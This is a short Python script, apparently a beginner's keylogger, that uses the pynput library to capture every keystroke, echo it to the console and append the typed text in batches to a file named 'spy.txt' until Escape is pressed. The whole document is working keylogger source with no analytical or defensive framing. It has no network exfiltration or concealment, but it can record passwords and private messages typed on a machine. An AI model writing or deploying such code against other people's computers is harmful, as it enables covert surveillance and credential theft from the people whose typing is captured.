import pynput

from pynput.keyboard import Key, Listener

count = 0
keys = []



def on_press(key):
    global keys, count
    
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    
    if count >= 10:
        count = 0
        write_file(keys)        
        keys = []
        
        
def write_file(keys):
    with open("spy.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","") #remove ''
            if k.find("space") > 0: #finds if backspace and enter space is pressed and delete it
                f.write('\n')   #text
            elif k.find("key") == -1:
                f.write(k)
    
    
def on_release(key):
    if key== Key.esc:
        return False
    
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

